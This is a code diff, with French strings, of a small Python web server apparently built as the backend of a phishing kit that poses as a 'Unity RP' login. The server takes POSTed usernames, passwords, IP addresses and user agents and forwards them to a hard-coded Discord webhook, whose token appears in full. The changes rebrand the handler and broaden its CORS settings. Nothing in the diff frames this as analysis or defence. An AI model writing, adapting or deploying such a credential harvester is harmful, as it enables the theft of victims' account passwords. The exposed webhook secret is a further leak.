@@ -1,16 +1,16 @@
+
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import json
 import datetime
 import urllib.request
 import os
 
-# Remplace par ton URL de webhook Discord valide
 WEBHOOK_URL = "https://discord.com/api/webhooks/1532553921095270530/dP3FzsnWbetZfkPN3HuRAKDY_xNCgfNekonHwEPoE4F_MQRmA-6v6-BC5hWbmBc2mmWK"
 
-class MyHandler(SimpleHTTPRequestHandler):
+class UnityRPHandler(SimpleHTTPRequestHandler):
     def end_headers(self):
         self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS, GET')
         self.send_header('Access-Control-Allow-Headers', 'Content-Type')
         super().end_headers()
 
@@ -32,10 +32,10 @@ class MyHandler(SimpleHTTPRequestHandler):
                 ip_addr = data.get('ip', 'Non spécifiée')
                 user_agent = data.get('userAgent', 'Non spécifié')
 
-                print(f"[+] Données reçues en ligne - Utilisateur: {username}")
+                print(f"[+] Données reçues - Utilisateur: {username}")
 
                 msg = (
-                    f"🚨 **NOUVELLE CONNEXION EN LIGNE (RENDER)** [{now}] 🚨\n"
+                    f"🚨 **NOUVELLE CONNEXION UNITY RP** [{now}] 🚨\n"
                     f"👤 **Utilisateur :** {username}\n"
                     f"🔑 **Mot de passe :** {password}\n"
                     f"🌐 **Adresse IP :** {ip_addr}\n"
@@ -57,17 +57,17 @@ class MyHandler(SimpleHTTPRequestHandler):
                 self.wfile.write(json.dumps({"status": "success"}).encode('utf-8'))
 
             except Exception as e:
-                print(f"[-] Erreur serveur : {e}")
+                print(f"[-] Erreur interne : {e}")
                 self.send_response(500)
+                self.send_header('Content-Type', 'application/json')
                 self.end_headers()
                 self.wfile.write(json.dumps({"status": "error", "message": str(e)}).encode('utf-8'))
         else:
             self.send_error(404, "Page non trouvée")
 
 if __name__ == '__main__':
-    # Récupération automatique du port attribué par Render (ou 10000 par défaut)
     port = int(os.environ.get("PORT", 10000))
     server_address = ('', port)
-    httpd = HTTPServer(server_address, MyHandler)
-    print(f"Serveur web démarré sur le port {port}...")
+    httpd = HTTPServer(server_address, UnityRPHandler)
+    print(f"Serveur Unity RP démarré sur le port {port}...")
     httpd.serve_forever()
